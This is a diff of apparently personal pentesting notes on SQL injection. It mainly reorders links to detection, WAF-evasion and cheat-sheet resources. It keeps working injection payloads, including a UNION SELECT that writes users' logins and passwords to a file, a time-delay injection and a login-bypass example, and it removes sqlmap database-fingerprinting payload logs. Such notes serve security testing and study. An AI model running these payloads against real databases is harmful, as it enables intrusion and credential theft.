@@ -1,16 +1,15 @@
 # sqli
 
-# detection summary
-http://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
+http://www.arneswinnen.net/2013/09/automated-sql-injection-detection/ # detection summary
+http://sqlfiddle.com/ # test sql
+http://bobby-tables.com/ # recommendations
+https://delicious.com/inquis/sqlinjection # a lot of articles on sqli
 
 # evasion
 https://github.com/client9/libinjection/blob/master/data/sqli-rsalgado-bhusa2013.txt # good tricks
-http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
+https://www.websec.ca/publication/Blog/Bypassing_WAFs_with_SQLMap
+https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/ https://websec.files.wordpress.com/2010/11/sqli2.pdf
 https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
-https://websec.files.wordpress.com/2010/11/sqli2.pdf
-
-# test sql 
-http://sqlfiddle.com/
 
 # cheatsheets
 http://www.sqlinjectionwiki.com/
@@ -19,10 +18,6 @@ https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
 http://pentestmonkey.net/category/cheat-sheet/sql-injection
 http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
-sqli-cheatsheets
-
-# a lot of articles on sqli
-https://delicious.com/inquis/sqlinjection
 
 # tips
 ?id=1 limit 0 union select login,password from users into outfile '/tmp/users'
@@ -30,13 +25,7 @@ outfile OR dumpfile
 concat() OR concat_ws() OR group_concat() (all lines in one line)
 always use UNION ALL in order to preserve duplicate rows
 
-select top 1 (ou 2) 0,1,table_name COLLATE DATABASE_DEFAULT,2,3...
- ou bien essayer:
-from thetable limit 1
-
-http://websec.ca/blog/view/Bypassing_WAFs_with_SQLMap
-
-twitter: "You can use %82 on MySQL 5 as a replacement for %2C when performing SQL injections"
+select top 1 (ou 2) 0,1,table_name COLLATE DATABASE_DEFAULT,2,3... ou bien essayer from thetable limit 1
 
 # extract the current running query
 http://www.contextis.com/resources/blog/sql-inception-how-select-yourself/
@@ -63,23 +52,13 @@ abc';waitfor delay '0:0:10'--
 -m POST -H 'Range: bytes=-1' -i 200
 
 # web for pentester II
-select * from users where username = 'doesntexist' or 'a'='a' and password = 'nobodyusedthispw' -> ( False ) OR ( True AND False) -> 0 result
-' or 'a'='a' limit 0,1 --%20
+select * from users where username = 'doesntexist' or 'a'='a' and password = 'nobodyusedthispw' -> False OR (True AND False) -> 0 result
 username=asdf\&password=+and+'a'='a -> username = 'asdf\' and password=' and 'a'='a'
 &limit=4+procedure+analyse()
 &group=id+..
 
 ## fingerprint db
 * sqlmap
-[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)&CHR(72)&CHR(108)&CHR(79) FROM MSysAccessObjects)=CHR(99)&CHR(72)&CHR(108)&CHR(79)
-[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)||CHR(72)||CHR(108)||CHR(79) FROM SYSIBM.SYSDUMMY1)=CHR(99)||CHR(72)||CHR(108)||CHR(79)
-[11:41:18] [PAYLOAD] 1 AND (SELECT 'cHlO' FROM RDB$DATABASE)='cHlO'
-[11:41:18] [PAYLOAD] 1 AND (SELECT 'cHlO' FROM VERSIONS)='cHlO'
-[11:41:18] [PAYLOAD] 1 AND (SELECT CHAR(99)+CHAR(72)+CHAR(108)+CHAR(79))=CHAR(99)+CHAR(72)+CHAR(108)+CHAR(79)
-[11:41:18] [PAYLOAD] 1 AND (SELECT 0x63486c4f)=0x63486c4f
-[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)||CHR(72)||CHR(108)||CHR(79) FROM DUAL)=CHR(99)||CHR(72)||CHR(108)||CHR(79)
-[11:41:18] [PAYLOAD] 1 AND (SELECT CHR(99)||CHR(72)||CHR(108)||CHR(79) FROM DUAL)=CHR(70)||CHR(114)||CHR(118)||CHR(71)
-
 * https://rdot.org/forum/showthread.php?t=118
 
 MySQL
@@ -240,5 +219,3 @@ Advanced Identification/Exploitation
     UTF-7 decoding
     Truncation issues
 
-# recommendations
-http://bobby-tables.com/
